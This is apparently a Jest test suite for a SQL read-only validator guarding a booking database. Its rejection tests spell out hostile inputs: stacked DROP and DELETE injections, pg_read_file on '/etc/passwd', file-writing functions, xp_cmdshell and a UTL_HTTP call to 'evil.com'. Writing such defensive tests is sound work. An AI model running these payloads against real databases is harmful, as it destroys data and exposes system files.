const { validateReadOnly } = require('../../utils/sqlGuard');

describe('validateReadOnly', () => {
  describe('happy path', () => {
    it('allows simple SELECT', () => {
      const r = validateReadOnly('SELECT * FROM "Booking" LIMIT 10');
      expect(r.ok).toBe(true);
      expect(r.safeSql).toContain('LIMIT 10');
    });

    it('appends LIMIT 100 when missing', () => {
      const r = validateReadOnly('SELECT count(*) FROM "Booking"');
      expect(r.ok).toBe(true);
      expect(r.safeSql).toBe('SELECT count(*) FROM "Booking" LIMIT 100');
    });

    it('allows WITH (CTE)', () => {
      const r = validateReadOnly('WITH t AS (SELECT 1) SELECT * FROM t');
      expect(r.ok).toBe(true);
    });

    it('allows SELECT with JOIN', () => {
      const r = validateReadOnly('SELECT b.id, t.title FROM "Booking" b JOIN "Tour" t ON b."tourId" = t.id');
      expect(r.ok).toBe(true);
      expect(r.safeSql).toContain('LIMIT 100');
    });

    it('allows SELECT with subquery', () => {
      const r = validateReadOnly('SELECT * FROM (SELECT id FROM "Booking") sub');
      expect(r.ok).toBe(true);
    });

    it('preserves existing LIMIT', () => {
      const r = validateReadOnly('SELECT * FROM "Booking" LIMIT 50');
      expect(r.ok).toBe(true);
      expect(r.safeSql).toBe('SELECT * FROM "Booking" LIMIT 50');
    });

    it('strips trailing semicolons', () => {
      const r = validateReadOnly('SELECT 1;');
      expect(r.ok).toBe(true);
      expect(r.safeSql).toBe('SELECT 1 LIMIT 100');
    });

    it('strips multiple trailing semicolons', () => {
      const r = validateReadOnly('SELECT 1;;;');
      expect(r.ok).toBe(true);
      expect(r.safeSql).toBe('SELECT 1 LIMIT 100');
    });
  });

  describe('input validation', () => {
    it('rejects null', () => {
      expect(validateReadOnly(null).ok).toBe(false);
      expect(validateReadOnly(null).error).toBe('No SQL provided');
    });

    it('rejects undefined', () => {
      expect(validateReadOnly(undefined).ok).toBe(false);
    });

    it('rejects empty string', () => {
      expect(validateReadOnly('').ok).toBe(false);
      expect(validateReadOnly('').error).toBe('No SQL provided');
    });

    it('rejects whitespace-only string', () => {
      expect(validateReadOnly('   ').ok).toBe(false);
      expect(validateReadOnly('   ').error).toBe('Empty SQL');
    });

    it('rejects non-string input', () => {
      expect(validateReadOnly(123).ok).toBe(false);
      expect(validateReadOnly({}).ok).toBe(false);
    });
  });

  describe('write operations', () => {
    it('rejects INSERT', () => {
      expect(validateReadOnly('INSERT INTO "Booking" VALUES (1)').ok).toBe(false);
    });

    it('rejects UPDATE', () => {
      expect(validateReadOnly('UPDATE "Booking" SET id=1').ok).toBe(false);
    });

    it('rejects DELETE', () => {
      expect(validateReadOnly('DELETE FROM "Booking"').ok).toBe(false);
    });

    it('rejects DROP TABLE', () => {
      expect(validateReadOnly('DROP TABLE "Booking"').ok).toBe(false);
    });

    it('rejects DROP DATABASE', () => {
      expect(validateReadOnly('DROP DATABASE travio').ok).toBe(false);
    });

    it('rejects ALTER TABLE', () => {
      expect(validateReadOnly('ALTER TABLE "Booking" ADD COLUMN x int').ok).toBe(false);
    });

    it('rejects TRUNCATE', () => {
      expect(validateReadOnly('TRUNCATE "Booking"').ok).toBe(false);
    });

    it('rejects CREATE TABLE', () => {
      expect(validateReadOnly('CREATE TABLE x (id int)').ok).toBe(false);
    });

    it('rejects GRANT', () => {
      expect(validateReadOnly('GRANT ALL ON x TO y').ok).toBe(false);
    });

    it('rejects REVOKE', () => {
      expect(validateReadOnly('REVOKE ALL ON x FROM y').ok).toBe(false);
    });

    it('rejects MERGE', () => {
      expect(validateReadOnly('MERGE INTO x USING y ON x.id = y.id').ok).toBe(false);
    });

    it('rejects COMMIT', () => {
      expect(validateReadOnly('COMMIT').ok).toBe(false);
    });

    it('rejects ROLLBACK', () => {
      expect(validateReadOnly('ROLLBACK').ok).toBe(false);
    });

    it('rejects ANALYZE', () => {
      expect(validateReadOnly('ANALYZE "Booking"').ok).toBe(false);
    });

    it('rejects VACUUM', () => {
      expect(validateReadOnly('VACUUM "Booking"').ok).toBe(false);
    });
  });

  describe('injected write in SELECT', () => {
    it('rejects SELECT with injected DROP', () => {
      expect(validateReadOnly('SELECT * FROM "Booking"; DROP TABLE "Booking"').ok).toBe(false);
    });

    it('rejects SELECT with injected DELETE', () => {
      expect(validateReadOnly('SELECT 1; DELETE FROM "Booking"').ok).toBe(false);
    });

    it('rejects SELECT with injected UPDATE', () => {
      expect(validateReadOnly('SELECT 1; UPDATE "Booking" SET id=1').ok).toBe(false);
    });

    it('rejects TRUNCATE as column name in SELECT', () => {
      expect(validateReadOnly('SELECT TRUNCATE FROM x').ok).toBe(false);
    });

    it('rejects DROP as column name in SELECT', () => {
      expect(validateReadOnly('SELECT DROP FROM x').ok).toBe(false);
    });
  });

  describe('multi-statement', () => {
    it('rejects two SELECTs separated by semicolon', () => {
      expect(validateReadOnly('SELECT 1; SELECT 2').ok).toBe(false);
    });

    it('rejects SELECT followed by INSERT', () => {
      expect(validateReadOnly('SELECT 1; INSERT INTO x VALUES (1)').ok).toBe(false);
    });
  });

  describe('SQL comments', () => {
    it('rejects single-line comment', () => {
      expect(validateReadOnly('SELECT 1 -- this is a comment').ok).toBe(false);
    });

    it('rejects block comment', () => {
      expect(validateReadOnly('/* comment */ SELECT 1').ok).toBe(false);
    });

    it('rejects inline block comment', () => {
      expect(validateReadOnly('SELECT /* hack */ 1').ok).toBe(false);
    });
  });

  describe('injection patterns', () => {
    it('rejects INTO OUTFILE', () => {
      expect(validateReadOnly("SELECT 1 INTO OUTFILE '/tmp/x'").ok).toBe(false);
    });

    it('rejects INTO DUMPFILE', () => {
      expect(validateReadOnly("SELECT 1 INTO DUMPFILE '/tmp/x'").ok).toBe(false);
    });

    it('rejects LOAD DATA', () => {
      expect(validateReadOnly("LOAD DATA INFILE '/tmp/x' INTO TABLE x").ok).toBe(false);
    });

    it('rejects pg_sleep', () => {
      expect(validateReadOnly('SELECT pg_sleep(10)').ok).toBe(false);
    });

    it('rejects pg_read_file', () => {
      expect(validateReadOnly("SELECT pg_read_file('/etc/passwd')").ok).toBe(false);
    });

    it('rejects pg_write_file', () => {
      expect(validateReadOnly("SELECT pg_write_file('/tmp/x', 'data')").ok).toBe(false);
    });

    it('rejects DBMS_PIPE', () => {
      expect(validateReadOnly('SELECT DBMS_PIPE.RECEIVE_MESSAGE(1,1) FROM dual').ok).toBe(false);
    });

    it('rejects UTL_HTTP', () => {
      expect(validateReadOnly("SELECT UTL_HTTP.REQUEST('http://evil.com') FROM dual").ok).toBe(false);
    });

    it('rejects xp_cmdshell', () => {
      expect(validateReadOnly("EXEC xp_cmdshell 'dir'").ok).toBe(false);
    });
  });

  describe('case insensitivity', () => {
    it('rejects lowercase insert', () => {
      expect(validateReadOnly('insert into x values (1)').ok).toBe(false);
    });

    it('rejects mixed case DROP', () => {
      expect(validateReadOnly('DrOp TaBlE x').ok).toBe(false);
    });

    it('allows lowercase select', () => {
      expect(validateReadOnly('select 1').ok).toBe(true);
    });
  });

  describe('advanced SQL', () => {
    it('allows UNION ALL', () => {
      const r = validateReadOnly('SELECT id FROM "Booking" UNION ALL SELECT id FROM "Tour"');
      expect(r.ok).toBe(true);
    });

    it('allows window functions', () => {
      const r = validateReadOnly('SELECT id, ROW_NUMBER() OVER (ORDER BY id) FROM "Booking"');
      expect(r.ok).toBe(true);
    });

    it('allows CASE expressions', () => {
      const r = validateReadOnly('SELECT CASE WHEN id > 0 THEN 1 ELSE 0 END FROM "Booking"');
      expect(r.ok).toBe(true);
    });

    it('allows EXISTS subquery', () => {
      const r = validateReadOnly('SELECT * FROM "Booking" b WHERE EXISTS (SELECT 1 FROM "Tour" t WHERE t.id = b."tourId")');
      expect(r.ok).toBe(true);
    });

    it('allows INTERSECT', () => {
      const r = validateReadOnly('SELECT id FROM "Booking" INTERSECT SELECT id FROM "Tour"');
      expect(r.ok).toBe(true);
    });

    it('allows EXCEPT', () => {
      const r = validateReadOnly('SELECT id FROM "Booking" EXCEPT SELECT id FROM "Tour"');
      expect(r.ok).toBe(true);
    });
  });
});
